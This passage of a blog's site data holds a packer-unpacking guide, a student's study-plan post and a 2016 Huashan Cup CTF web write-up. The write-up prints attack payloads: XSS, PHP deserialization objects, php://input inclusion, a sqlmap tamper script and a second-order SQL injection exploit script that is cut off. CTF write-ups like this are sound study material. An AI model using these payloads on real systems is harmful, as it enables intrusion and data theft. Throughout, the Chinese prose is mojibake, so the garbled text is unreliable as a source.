å°±æ˜¯00401000å¤„ï¼‰ï¼ŒæŒ‰F2ä¸‹æ–­ç‚¹ã€‚ç„¶åæŒ‰SHIFT+F9ï¼ˆæˆ–è€…æ˜¯åœ¨æ²¡å¼‚å¸¸æƒ…å†µä¸‹æŒ‰F9ï¼‰ï¼Œ  ç›´æ¥åˆ°è¾¾ç¨‹åºOEP</p><h2 id="ä¸€æ­¥åˆ°è¾¾OEP"><a href="#ä¸€æ­¥åˆ°è¾¾OEP" class="headerlink" title="ä¸€æ­¥åˆ°è¾¾OEP"></a>ä¸€æ­¥åˆ°è¾¾OEP</h2><p>ï¼ˆ1ï¼‰å¼€å§‹æŒ‰Ctrl+F,è¾“å…¥ï¼špopadï¼ˆåªé€‚åˆå°‘æ•°å£³ï¼ŒåŒ…æ‹¬UPXï¼ŒASPACKå£³ï¼‰ï¼Œç„¶åæŒ‰ä¸‹F2ï¼Œ  F9è¿è¡Œåˆ°æ­¤å¤„<br>ï¼ˆ2ï¼‰æ¥åˆ°å¤§è·³è½¬å¤„ï¼Œç‚¹ä¸‹F8ï¼Œåˆ°è¾¾OEP</p><h2 id="æœ€åä¸€æ¬¡å¼‚å¸¸æ³•"><a href="#æœ€åä¸€æ¬¡å¼‚å¸¸æ³•" class="headerlink" title="æœ€åä¸€æ¬¡å¼‚å¸¸æ³•"></a>æœ€åä¸€æ¬¡å¼‚å¸¸æ³•</h2><p>ï¼ˆ1ï¼‰ç”¨ODæ‰“å¼€è½¯ä»¶<br>ï¼ˆ2ï¼‰ç‚¹å‡»é€‰é¡¹â€”â€”è°ƒè¯•é€‰é¡¹â€”â€”å¼‚å¸¸ï¼ŒæŠŠé‡Œé¢çš„âˆšå…¨éƒ¨å»æ‰ï¼CTRL+F2é‡è½½ä¸‹ç¨‹åº<br>ï¼ˆ3ï¼‰ä¸€å¼€å§‹ç¨‹åºå°±æ˜¯ä¸€ä¸ªè·³è½¬ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬æŒ‰SHIFT+F9ï¼Œç›´åˆ°ç¨‹åºè¿è¡Œï¼Œè®°ä¸‹ä»å¼€å§‹æŒ‰SHIFT+F9åˆ°ç¨‹åºè¿è¡Œçš„æ¬¡æ•°m<br>ï¼ˆ4ï¼‰CTRL+F2é‡è½½ç¨‹åºï¼ŒæŒ‰SHIFT+F9ï¼ˆè¿™æ¬¡æŒ‰çš„æ¬¡æ•°ä¸ºç¨‹åºè¿è¡Œçš„æ¬¡æ•°m-1æ¬¡ï¼‰<br>ï¼ˆ5ï¼‰åœ¨ODçš„å³ä¸‹è§’æˆ‘ä»¬çœ‹è§æœ‰ä¸€ä¸ªâ€SE å¥æŸ„â€ï¼Œè¿™æ—¶æˆ‘ä»¬æŒ‰CTRL+Gï¼Œè¾“å…¥SE å¥æŸ„å‰çš„åœ°å€<br>ï¼ˆ6ï¼‰æŒ‰F2ä¸‹æ–­ç‚¹ï¼Œç„¶åæŒ‰SHIFT+F9æ¥åˆ°æ–­ç‚¹å¤„<br>ï¼ˆ7ï¼‰å»æ‰æ–­ç‚¹ï¼ŒæŒ‰F8æ…¢æ…¢å‘ä¸‹èµ°<br>ï¼ˆ8ï¼‰åˆ°è¾¾ç¨‹åºçš„OEP</p><h2 id="æ¨¡æ‹Ÿè·Ÿè¸ªæ³•"><a href="#æ¨¡æ‹Ÿè·Ÿè¸ªæ³•" class="headerlink" title="æ¨¡æ‹Ÿè·Ÿè¸ªæ³•"></a>æ¨¡æ‹Ÿè·Ÿè¸ªæ³•</h2><p>ï¼ˆ1ï¼‰å…ˆè¯•è¿è¡Œï¼Œè·Ÿè¸ªä¸€ä¸‹ç¨‹åºï¼Œçœ‹æœ‰æ²¡æœ‰SEHæš—æ¡©ä¹‹ç±»<br>ï¼ˆ2ï¼‰ALT+Mæ‰“å¼€å†…å­˜é•œåƒï¼Œæ‰¾åˆ°ï¼ˆåŒ…å«é‚£ä¸€åˆ—ä¸­å‡ºç°SFX,imports,relocationsæˆ–è€…SFX,è¾“  å…¥è¡¨ï¼Œé‡å®šä½ï¼‰<br>ï¼ˆ3ï¼‰è‹¥åœ°å€ä¸º00xxxxxxåœ¨å‘½ä»¤è¡Œä¸‹è¾“å…¥tc eip&lt;00xxxxxxï¼Œå›è½¦ï¼Œæç¤ºæ­£åœ¨è·Ÿè¸ª</p><h2 id="SFXæ³•"><a href="#SFXæ³•" class="headerlink" title="SFXæ³•"></a>SFXæ³•</h2><p>ï¼ˆ1ï¼‰è®¾ç½®ODï¼Œå¿½ç•¥æ‰€æœ‰å¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯è¯´å¼‚å¸¸é€‰é¡¹å¡é‡Œé¢éƒ½æ‰“ä¸Šå‹¾<br>ï¼ˆ2ï¼‰åˆ‡æ¢åˆ°SFXé€‰é¡¹å¡ï¼Œé€‰æ‹©â€œå­—èŠ‚æ¨¡å¼è·Ÿè¸ªå®é™…å…¥å£ï¼ˆé€Ÿåº¦éå¸¸æ…¢ï¼‰â€ï¼Œç¡®å®š<br>ï¼ˆ3ï¼‰é‡è½½ç¨‹åºï¼ˆå¦‚æœè·³å‡ºæ˜¯å¦â€œå‹ç¼©ä»£ç ï¼Ÿâ€é€‰æ‹©â€œå¦â€ï¼ŒODç›´æ¥åˆ°è¾¾OEPï¼‰</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ‰æ—¶å€™æƒ³æƒ³ æ˜¯å¾—è§„åˆ’ä¸€ä¸‹è‡ªå·±äº†</title>
      <link href="tell_myself.html"/>
      <url>tell_myself.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>æœ‰æ—¶å€™ä¸çŸ¥é“è‡ªå·±åœ¨åšä»€ä¹ˆå‘¢ ï¼Œè™½ç„¶çŸ¥é“è‡ªå·±æ˜¯è¦ç©<code>Bin</code>çš„ï¼Œæˆ‘ä¹Ÿæ˜¯å½“è¿™ä¸ªæ˜¯è‡ªå·±çš„çˆ±å¥½ç”šè‡³æ˜¯ä»¥åè‡ªå·±å°±æƒ³å‘å±•è¿™æ¡è·¯äº†ï¼Œ</p><p>ä½†æ˜¯è¶Šæ¥è¶Šè§‰å¾—è‡ªå·±<strong>è¾£é¸¡</strong>é˜¿</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/vegtable-hhh.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/vegtable-hhh.jpg"></a></p><p>ä¸€å¤©åˆ°æ™šéƒ½ä¸çŸ¥é“åœ¨æŠ˜è…¾ä»€ä¹ˆ</p><p>è¯´å­¦pythonå§  åªä¼šå†™å†™å°ä¸œè¥¿  çˆ¬è™«ä»€ä¹ˆçš„éƒ½ä¸ä¼š</p><p>è¯´é€†å‘å§   çœ‹çœ‹ç®€å•çš„ç®—æ³•è¿˜å¯ä»¥  å…¶ä»–çš„ æˆ‘å°±åªèƒ½è¯´æˆ‘ã€‚ã€‚ã€‚</p><p>è¯´æº¢å‡ºå§  çŸ¥é“ä»£ç å“ªé‡Œæœ‰é—®é¢˜ å°±æ˜¯ä¸ä¼šåˆ©ç”¨  ç°åœ¨è¿<strong>shellcode</strong>éƒ½ä¸çŸ¥é“æ€ä¹ˆç”¨</p><p>å¤§äºŒäº†</p><p><code> æ±ªå¸ˆå‚…</code>å’Œæˆ‘è¯´<br>æ¯å¤©æŠ˜è…¾ç‚¹ä»€ä¹ˆ  éšä¾¿æŠ˜è…¾  æ…¢æ…¢ç§¯ç´¯ æ€»ä¼šæˆé•¿çš„<br>ä½†æ˜¯ã€‚ã€‚ã€‚è¿˜æ˜¯å¾—æœ‰ä¸ªå¤§æ–¹å‘ å‘Šè¯‰è‡ªå·±  ä»Šå¹´è¦å¹²å®Œä»€ä¹ˆ è‡ªå·±è¦å®Œæˆä»€ä¹ˆå˜›</p><p><code>Yllenå­¦é•¿</code>å‘Šè¯‰æˆ‘  ä½ åº”è¯¥æœ‰ä¸€ä¸ªè®¡åˆ’  æ˜¯çš„æˆ‘åº”è¯¥è¦æœ‰ä¸€ä¸ªè®¡åˆ’ è‡³å°‘å‘Šè¯‰è‡ªå·± çœ‹å®Œä»€ä¹ˆä¹¦  å­¦å¥½ä»€ä¹ˆ  åˆ°ä»€ä¹ˆæ ·çš„å¢ƒåœ°å§</p><blockquote><p>é€†å‘<br>é€†å‘  hook è°ƒè¯•æŠ€æœ¯æ€»å¾—è§£å†³å§  è¿˜æœ‰åè°ƒè¯•</p><blockquote><p> æº¢å‡º<br> æˆ‘è¿™å­¦æœŸä¸€å®šè¦å…¥é—¨ è‡³å°‘è¦ä¼šå†™POCå§<br> IDAå’ŒOlyDbgå¾—å¤šç”¨ç”¨äº†<br> è¿˜æœ‰ é‚£ä¸ª 0dayçš„ä¹¦ æˆ‘å¾—çœ‹å®Œå§ã€‚ã€‚ã€‚<br> è¿˜å¾—å¤šæ¥è§¦ä¸€ä¸‹å£³å‘¢ </p><p> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/siwen.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/siwen.jpg"></a><br> éšä¾¿æŠ˜è…¾ åˆ°å¤„æŠ˜è…¾ å°±æ˜¯æŠ˜è…¾ã€‚ã€‚ã€‚233<br> å¥½å¥½å­¦ä¹ å¤©å¤©å‘ä¸Š<br> â€‹       2016-09-18 00:24:26</p></blockquote></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2016-ä¸­å›½Â·è¥¿å®‰ åå±±æ¯ Writeup-SeeSea</title>
      <link href="2016-Hs-ctf-SeeSea-writeup.html"/>
      <url>2016-Hs-ctf-SeeSea-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://yunpan.cn/ckyrKxHJDPAIN">é¢˜ç›®åˆ†äº«</a>ï¼ˆæå–ç ï¼šbbafï¼‰</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ç­¾åˆ°-10"><a href="#ç­¾åˆ°-10" class="headerlink" title="ç­¾åˆ°(10)"></a>ç­¾åˆ°(10)</h2><blockquote><p>æ‰«ç å›å¤ <code>hs_ctf</code>æ‹¿flag,  å¥—è·¯é¢˜ã€‚<br><code>flag_Xd&#123;hSh_ctf:WelcomeTo2016XiDian&amp;HumenHS&#125;</code></p></blockquote><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/61851063.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/61851063.jpg"></a></p><h2 id="æ‰“ä¸è¿‡-50"><a href="#æ‰“ä¸è¿‡-50" class="headerlink" title="æ‰“ä¸è¿‡~(50)"></a>æ‰“ä¸è¿‡~(50)</h2><blockquote><p>æ‰“ä¸è¿‡ç»•é“èµ°~ <a href="http://huashan.xdsec.cn/ctf_hs_00b.php">http://huashan.xdsec.cn/ctf_hs_00b.php</a></p></blockquote><p>ç›´æ¥å°†submitæŒ‰é’®æ”¹æˆå¯ç‚¹å‡»ï¼Œç„¶åæŠ“åŒ…ï¼Œå‘ç°<code>str</code>å€¼ä¸º<code>OGM0MzU1NTc3MTdhMTQ4NTc4ZmQ4MjJhYWVmOTYwNzk=</code>ï¼Œæ‹¿å‡ºæ¥è§£base64ï¼Œç„¶åå†è§£ä¸€é“md5ï¼Œå¾—åˆ°æ˜¯<code>1931b</code>ï¼Œç„¶åæäº¤<code>Password=1931b</code>ï¼Œå¾—flag:<code>flag_Xd&#123;hSh_ctf:XD_aA@lvmM&#125;</code></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/93429080.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/93429080.jpg"></a></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/35641631.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/35641631.jpg"></a></p><h2 id="ç³»ç»Ÿç®¡ç†-100"><a href="#ç³»ç»Ÿç®¡ç†-100" class="headerlink" title="ç³»ç»Ÿç®¡ç†(100)"></a>ç³»ç»Ÿç®¡ç†(100)</h2><blockquote><p><a href="http://huashan.xdsec.cn/xt">http://huashan.xdsec.cn/xt</a>  è´¦æˆ·:admin  å¯†ç :admin  è¯·ç™»é™†<br>é¦–æ¬¡å‘åŒ…ï¼Œè¿”å›éƒ¨åˆ†æºç ï¼Œæ˜¯<code>username</code>çš„md5å€¼ä¸º0ï¼Œæ‰€ä»¥ä»¤<code>username</code>å€¼ä¸º<code>QNKCDZO</code>ã€‚</p></blockquote><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/25806101.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/25806101.jpg"></a></p><p>ç„¶åè¿”å›äº†<code>user.php</code>ï¼Œç„¶åå¯¹<code>user.php</code>è¿›è¡Œå‘åŒ…ã€‚çœ‹åˆ°äº†æ–°çš„æºç ï¼Œæ˜¯ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ã€‚ç„¶åæ„é€ <code>password=a:2:&#123;s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;&#125;</code>ï¼Œå‘<code>index.php</code>å‘åŒ…ã€‚å¾—åˆ°flag:<code>flag_Xd&#123;hSh_ctf:kidhvuensl^$&#125;</code>ã€‚</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/63995380.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/63995380.jpg"></a></p><h2 id="ç®€å•js-100"><a href="#ç®€å•js-100" class="headerlink" title="ç®€å•js(100)"></a>ç®€å•js(100)</h2><blockquote><p>æ¥é“jså‰èœï¼Œçƒ­èº«ä¸€ä¸‹å§~  <a href="http://huashan.xdsec.cn/jdjs">http://huashan.xdsec.cn/jdjs</a></p></blockquote><p>è¿›å»åä¸èƒ½å³é”®æºç ï¼Œå…¶å®å„ç§æŸ¥çœ‹æºç çš„æ³•å­ï¼Œä¾‹å¦‚ç«ç‹f12æ‰“å¼€firebugï¼Œç„¶åæºç é‡Œå°±æ˜¯ç®€å•çš„jsè€Œå·²</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:08:21%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:08:21%20"></a></p><p>åœ¨æ§åˆ¶å°é‡Œè¿è¡Œå³å¯å¾—åˆ°keyå€¼ï¼Œsubmitå¾—åˆ°flagã€‚æˆ–è€…å¹²è„†ç›´æ¥onclick=â€return check();â€å»æ‰</p><h2 id="å¼¹å¼¹å¼¹ï¼-150"><a href="#å¼¹å¼¹å¼¹ï¼-150" class="headerlink" title="å¼¹å¼¹å¼¹ï¼(150)"></a>å¼¹å¼¹å¼¹ï¼(150)</h2><blockquote><p>å¼¹å‡ºé±¼å°¾çº¹ï¼~  <a href="http://huashan.xdsec.cn/ctf_hs_00a.php">http://huashan.xdsec.cn/ctf_hs_00a.php</a></p></blockquote><p>å¾ˆç®€å•çš„xssï¼Œè¿‡æ»¤ä¸ä¸¥ï¼Œ<br><code>&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt; </code></p><p>xssï¼Œç›´æ¥æ„é€ payload<code>&lt;BODY%2BONLOAD%253Dalert%2528%2527XSS%2527%2529&gt;</code></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/66687170.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/66687170.jpg"></a></p><h2 id="233-150"><a href="#233-150" class="headerlink" title="233(150)"></a>233(150)</h2><blockquote><p>å°‘å¹´ï¼Œè€å¥—è·¯ï¼Œä½ éƒ½æ‡‚å¾—~  <a href="http://huashan.xdsec.cn/233/">http://huashan.xdsec.cn/233/</a></p></blockquote><p>æŸ¥çœ‹æºä»£ç  èƒ½çœ‹åˆ°æ˜¯JSfuckç¼–ç  è§£ç  </p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:11:22%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:11:22%20"></a></p><p>å¾—åˆ°åŠ å¯†åçš„ä¸€å¥è¯æœ¨é©¬<br><strong>â”¼æ” æ•¸ç•£æ•´çˆ ç…¥æ•µç‘³âˆ¨ä¥ç¥³ã´ã§â‰´â”©&gt;</strong><br>è§£å¯†å¾—åˆ°ä¸€å¥è¯å¯†ç <code>e@syt0g3t</code><br>å¾—åˆ° <code>flag_Xd&#123;hSh_ctf:e@syt0g3t&#125;</code></p><h2 id="æ— é—´é“-200"><a href="#æ— é—´é“-200" class="headerlink" title="æ— é—´é“(200)"></a>æ— é—´é“(200)</h2><blockquote><p>æ— é—´é“ï¼šæ”¾ä½ çš„äººæ¥æˆ‘è¿™ï¼Ÿ~ <a href="http://huashan.xdsec.cn/upload/index.php">http://huashan.xdsec.cn/upload/index.php</a></p></blockquote><p>åˆ©ç”¨â€œphpå¾ˆçƒ¦äººâ€é‚£é¢˜å¾—åˆ°index.phpæºç ï¼Œflagå°±åœ¨å…¶ä¸­</p><p>æ­£ç¡®è§£æ³•ï¼š<br>ä¸€é“ä¸Šä¼ æˆªæ–­é¢˜ç›®,è¿‡ç¨‹ä¸å¤šè¯´ã€‚ç›´æ¥fuzz %80~%00ä¸­é—´çš„å­—ç¬¦,å³å¯ä¸Šä¼ æˆåŠŸ,å¾—åˆ°è¿”å›çš„flagã€‚ç”±äºä¸Šä¼ åˆ é™¤æ–‡ä»¶çš„è¿‡ç¨‹æœ‰å»¶æ—¶,å¯èƒ½å­˜åœ¨ç«äº‰ä¸Šä¼ é—®é¢˜ã€‚</p><h2 id="Mory-try"><a href="#Mory-try" class="headerlink" title="Mory try"></a>Mory try</h2><p>æ²¡åšå‡ºæ¥<br>çœ‹äº†å¸ˆå‚…ä»¬çš„wp<br>è¿‡ç¨‹å¤§æ¦‚æ˜¯<br><strong>roleå‚æ•°é‡Œæ˜¯ä¸¤æ¬¡base64ç¼–ç ï¼Œæµ‹è¯•åå¯ä»¥æ³¨å…¥ã€‚ä½¿ç”¨sqlmapçš„random user-agentç»•è¿‡ä¸€ä¸‹ï¼Œå¹¶ç¼–å†™ä¸¤æ¬¡base64çš„tamperï¼š</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Copyright (c) 7 team  All rights reserved</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload</span>):</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = urllib.quote(retVal)</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½å¾—åˆ°flag<br><code>flag_xd&#123;hsh_ctf:sql_succeed!&#125;</code></p><h2 id="phpå¾ˆçƒ¦äºº-200"><a href="#phpå¾ˆçƒ¦äºº-200" class="headerlink" title="phpå¾ˆçƒ¦äºº(200)"></a>phpå¾ˆçƒ¦äºº(200)</h2><blockquote><p>ä½†phpä»ç„¶æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€   <a href="http://huashan.xdsec.cn/php/">http://huashan.xdsec.cn/php/</a><br>å‘åŒ…ï¼Œçœ‹åˆ°æºç ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$pass &#x3D; $_GET[&quot;pass&quot;];</span><br><span class="line"></span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); &#x2F;&#x2F;class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>æ˜¯è®©ä¼ ä¸‰ä¸ªå‚æ•°<code>user,file,pass</code>ï¼Œç„¶åå…ˆæ„é€ <code>user=php://input</code>,postå€¼<code>the user is admin</code>ã€‚<code>file=class.php</code>ï¼Œ<code>pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;</code>ååºåˆ—åŒ–å»è¯»å–<code>f1a9.php</code>ã€‚ç›´æ¥å‡º<code>flag</code>ã€‚</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/78532530.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/78532530.jpg"></a></p><h2 id="ä¸‰ç§’é’Ÿè®°å¿†-300"><a href="#ä¸‰ç§’é’Ÿè®°å¿†-300" class="headerlink" title="ä¸‰ç§’é’Ÿè®°å¿†(300)"></a>ä¸‰ç§’é’Ÿè®°å¿†(300)</h2><blockquote><p>ä¸‰ç§’é’Ÿè®°å¿†</p></blockquote><p>æœ€è¿‘åªæœ‰ä¸‰ç§’é’Ÿè®°å¿†ï¼Œå¿˜è®°çš„äº‹æƒ…æ€»æ˜¯è¦ä¸€éä¸€éçš„æ‰¾å›æ¥â€¦<br><a href="http://huashan.xdsec.cn/pic">http://huashan.xdsec.cn/pic</a></p><p>è¿™é¢˜ä¹Ÿæ²¡åšå‡ºæ¥</p><p>ä¹Ÿæ˜¯çœ‹äº†å¸ˆå‚…ä»¬çš„wp<br>**<code>äºŒæ¬¡æ³¨å…¥ï¼Œè§¦å‘ç‚¹åœ¨å¯†ç æ‰¾å›é‚£è¾¹ã€‚expï¼š</code>**</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#by mathias@xdsec</span></span><br><span class="line"><span class="comment"># Copyright (c) 7 team  All rights reserved</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regist</span>(<span class="params">usr</span>):</span></span><br><span class="line">    flag=<span class="literal">False</span></span><br><span class="line">    url=<span class="string">&quot;http://huashan.*****.cn/pic/index.php?page=login&quot;</span></span><br><span class="line">    payload=&#123;<span class="string">&#x27;name&#x27;</span>:usr,<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;register&#x27;</span>:<span class="string">&#x27;%E6%B3%A8%E5%86%8C&#x27;</span>&#125;</span><br><span class="line">    r=requests.post(url,data=payload)</span><br><span class="line">    txt=r.text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Duplicate&#x27;</span> <span class="keyword">in</span> txt <span class="keyword">or</span> len(txt)==<span class="number">503</span>:</span><br><span class="line">        flag=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>(<span class="params">usr</span>):</span></span><br><span class="line">    flag=<span class="literal">False</span></span><br><span class="line">    url=<span class="string">&quot;http://huashan.*****.cn/pic/index.php?page=login&quot;</span></span><br><span class="line">    payload=&#123;<span class="string">&#x27;name&#x27;</span>:usr,<span class="string">&#x27;reset&#x27;</span>:<span class="string">&#x27;%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81&#x27;</span>&#125;</span><br><span class="line">    r=requests.post(url,data=payload)</span><br><span class="line">    <span class="keyword">if</span> len(r.text)==<span class="number">460</span>:</span><br><span class="line">        flag=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://huashan.*****.cn/pic/index.php?page=login&quot;</span></span><br><span class="line">    flag=<span class="literal">False</span></span><br><span class="line">    user=str(random.randint(<span class="number">10000000000</span>,<span class="number">99999999999</span>))</span><br><span class="line">    p=user+<span class="string">&#x27;\&#x27; and (select ascii(substr(flag,1,1)) from flag)&gt;50#&#x27;</span> </span><br><span class="line">    flag=regist(user)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;regist &quot;</span>+user+<span class="string">&quot; error&quot;</span></span><br><span class="line">        os._exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;regist &quot;</span>+user+<span class="string">&quot; success&quot;</span></span><br><span class="line"></span><br><span class="line">    flag=regist(p)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;regist &quot;</span>+p+<span class="string">&quot; error&quot;</span></span><br><span class="line">        os._exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;regist &quot;</span>+p+<span class="string">&quot; success,now reset password&quot;</span></span><br><span class="line"></span><br><span class="line">    flag=reset(p)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Reset success,now inject&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;reset &quot;</span>+p+<span class="string">&quot; error&quot;</span></span><br><span class="line">        os._exit()</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://huashan.*****.cn/pic/index.php?page=login&quot;</span></span><br><span class="line">    payload=&#123;<span class="string">&#x27;name&#x27;</span>:user,<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;login&#x27;</span>:<span class="string">&#x27;%E7%99%BB%E5%BD%95&#x27;</span>&#125;</span><br><span class="line">    r=requests.post(url,data=payload)</span><br><span class="line">    <span class="keyword">if</span> len(r.text)==<span class="number">486</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;payload is 